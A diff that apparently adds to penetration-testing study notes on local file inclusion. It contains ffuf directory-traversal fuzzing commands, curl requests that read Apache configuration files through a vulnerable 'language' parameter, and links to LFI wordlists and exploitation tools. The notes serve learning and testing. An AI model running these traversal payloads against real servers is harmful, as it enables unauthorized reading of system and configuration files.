@@ -27,3 +27,19 @@ Depending on our LFI situation, we may need to add a few back directories (e.g. 
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
 ```
 ### Server Logs/Configurations
+- [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
+- [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
+```
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+```
+Then we can try to read the discovered files:
+```
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+```
+```
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+```
+### LFI Tools
+- [LFISuite](https://github.com/D35m0nd142/LFISuite)
+- [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
+- [liffy](https://github.com/mzfr/liffy)
